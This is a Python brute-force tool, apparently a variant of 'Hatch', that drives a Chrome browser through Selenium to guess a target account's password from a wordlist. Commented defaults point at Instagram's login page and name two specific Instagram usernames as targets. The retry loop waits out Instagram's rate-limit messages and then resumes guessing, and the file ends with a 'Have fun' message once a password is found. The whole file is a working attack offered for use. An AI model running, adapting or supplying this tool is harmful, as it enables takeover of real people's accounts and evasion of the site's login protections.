# Coded by METACHAR
# Looking to work with other hit me up on my email @metachar1@gmail.com <--
import sys
import datetime
import selenium
import requests
import traceback
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException


#Graphics
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CWHITE  = '\33[37m'


#Config#
parser = OptionParser()
now = datetime.datetime.now()


#Args
parser.add_option("-u", "--username", dest="username",help="Choose the username")
parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_option("--website", dest="website",help="choose a website")
parser.add_option("--result", dest="result",help="choose a result")
(options, args) = parser.parse_args()




def wizard():
    print (banner)
    website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
    #website = "https://www.instagram.com/accounts/login/"
    sys.stdout.write(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists '),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print (color.GREEN + '[OK]'+color.CWHITE)
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print (color.RED + '[!]'+color.CWHITE+ 'User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print (color.RED + '[X]'+color.CWHITE)
        t.sleep(1)
        print (color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')
        exit()

    username_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
    #username_selector = "#react-root > section > main > div > article > div > div:nth-child(1) > div > form > div:nth-child(2) > div > label > input"
    password_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
    #password_selector = "#react-root > section > main > div > article > div > div:nth-child(1) > div > form > div:nth-child(3) > div > label > input"
    login_btn_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
    #login_btn_selector ="#react-root > section > main > div > article > div > div:nth-child(1) > div > form > div:nth-child(4) > button > div"
    #text_result = "#slfErrorAlert"
    text_result = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the result text selector: ')
    username = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
    #username = "milo.her798"
    #username = "rsflorez_"
    pass_list = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
    #pass_list = "/Users/mac/Desktop/pass1.txt"
    brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website, text_result)

def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website, text_result):
    f = open(pass_list, 'r')
    driver = webdriver.Chrome()
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    count = 1 #count
    browser = webdriver.Chrome(chrome_options=optionss)
    c = 0
    while True:
        try:
            for line in f:
                browser.get(website)
                t.sleep(2)
                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                # browser.find_element_by_css_selector(password_selector).clear()
                # browser.find_element_by_css_selector(username_selector).clear()
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                t.sleep(3)
                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
                c = c+1     
                print ('------------------------')
                print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                enter.click()
                #t.sleep(2)
                result = browser.find_element_by_css_selector(text_result)
                print(color.GREEN + "Result: "+ color.RED + result.text)
                #if result.text == "La contraseña no es correcta. Compruébala.":       
                while result.text == "Espera unos minutos antes de volver a intentarlo." or result.text == "Se produjo un error al iniciar sesión en Instagram. Vuelve a intentarlo más tarde.":
                    print("Vamo a calmarno...")
                    t.sleep(180)
                    browser.get(website)
                    t.sleep(2)
                    Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                    Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                    # browser.find_element_by_css_selector(password_selector).clear()
                    # browser.find_element_by_css_selector(username_selector).clear()
                    Sel_user.send_keys(username)
                    Sel_pas.send_keys(line)
                    t.sleep(3)
                    enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector  
                    print ('------------------------')
                    print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                    enter.click()
                    #t.sleep(2)
                    result = browser.find_element_by_css_selector(text_result)
                    print(color.GREEN + "Result: "+ color.RED + result.text)
                    if result.text == "La contraseña no es correcta. Compruébala.":    
                        print("Nope, intento #%i" %c)

                print("Nope, intento #%i" %c)
                print ('------------------------')
                #print (color.GREEN + 'Password has been found!!!!! {0}'.format(line))
                #print (color.YELLOW + 'Have fun :D')
        #except selenium.common.exceptions.ElementClickInterceptedException:
         #   x = traceback.format_exc()
          #  print(x)
        except KeyboardInterrupt: #returns to main menu if ctrl C is used
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print(color.GREEN + "Result: "+ color.RED + result.text)
            print (color.GREEN + 'Password has been found: {0}'.format(line))
            print (color.YELLOW + 'Have fun :)')
            t.sleep(60)
            exit()



banner = color.BOLD + color.RED +'''
  _    _       _       _
 | |  | |     | |     | |
 | |__| | __ _| |_ ___| |__ 
 |  __  |/ _` | __/ __| '_ \\
 | |  | | (_| | || (__| | | |
 |_|  |_|\__,_|\__\___|_| |_|
  {0}[{1}-{2}]--> {3}V.1.0
  {4}[{5}-{6}]--> {7}coded by Metachar
  {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)

driver = webdriver.Chrome()
optionss = webdriver.ChromeOptions()
optionss.add_argument("--disable-popup-blocking")
optionss.add_argument("--disable-extensions")
count = 1 #count

if options.username == None:
    if options.usernamesel == None:
        if options.passsel == None:
            if options.loginsel == None:
                if options.passlist == None:
                    if options.website == None:
                        if options.result == None:
                            wizard()


username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
text_result = options.result
print (banner)
brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website, text_result)



